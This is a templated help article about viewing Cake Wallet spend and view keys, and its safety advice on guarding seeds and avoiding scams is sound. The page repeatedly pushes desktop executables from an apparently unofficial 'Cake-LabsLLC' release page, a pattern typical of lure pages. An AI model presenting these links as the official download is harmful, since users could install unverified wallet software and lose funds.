<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">View spend and view keys in Cake Wallet | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

Keys are sensitive wallet credentials. Use the wallet’s available key or recovery information options only on a trusted device, and never send keys to another person or service.

## You'll see this if

- You need to understand the difference between a spend key and a view key, or you are looking for wallet recovery details. You may also be considering sharing information to prove ownership.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

A spend key can authorize spending, while a view key relates to viewing wallet activity. Both are sensitive, and revealing wallet information can compromise privacy or control depending on what is disclosed. The app’s screens and available recovery options can vary, so do not assume a particular menu name. A PIN is not a substitute for safely handling keys.

## Fix

1. Confirm that you are using the genuine Cake Wallet app on a device you control. Do not follow instructions from an unsolicited message or remote helper.
2. Open the wallet and look through its settings or recovery-information area. Use only options presented by the app itself; exact screen names may vary.
3. Before displaying key material, make sure no one can see or record your screen. Close screen sharing, disable recording, and avoid public or shared devices.
4. If your purpose is recovery, determine whether you have a seed or keys. Cake Wallet has a [guide to restoring from keys](./cake-wallet-restore-from-keys.md); do not paste credentials into a web page.
5. Record any information only in a private offline form if you have a legitimate need to retain it. Check transcription carefully and store it securely.
6. You can review the official [Cake Wallet desktop repository](https://github.com/Cake-LabsLLC/cake-wallet-desktop) for release information.

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

For recovery context, read [Cake Wallet’s backup guidance](./cake-wallet-backup-seed.md) and [wallet safety notes](./is-cake-wallet-safe.md).

For another perspective, read the [Cake Wallet related guide](./cake-wallet-privacy-tips.md).

---

## If that did not work

If you cannot locate the relevant information, do not install unofficial tools or grant remote access. Consult general in-app help or resources from the official project. If you suspect that a spend key or seed was exposed, treat the wallet as potentially compromised and consider moving funds to a new wallet you control. Sweeping means sending all funds to a new wallet; understand the process before acting. The [Cake Wallet seed backup article](./cake-wallet-backup-seed.md) covers keeping recovery material private.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

## Prevention

Never post keys, seed words, QR codes containing recovery data, or screenshots of them. Legitimate support does not need your seed or spend key. Avoid storing secrets in email, cloud notes, or shared password managers unless you have deliberately assessed the risks and protections. Keep wallet recovery information separate from everyday device access details. For more context on careful handling, read [Cake Wallet privacy tips](./cake-wallet-privacy-tips.md).



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [What to do if you forgot your Cake Wallet PIN | Cake Wallet](./cake-wallet-forgot-pin.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Manage multiple wallets in Cake Wallet | Cake Wallet](./cake-wallet-multiple-wallets.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Understand newer and legacy seed formats in Cake Wallet | Cake Wallet](./cake-wallet-polyseed-vs-legacy-seed.md) | Practical, private steps for resolving this Cake Wallet question. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
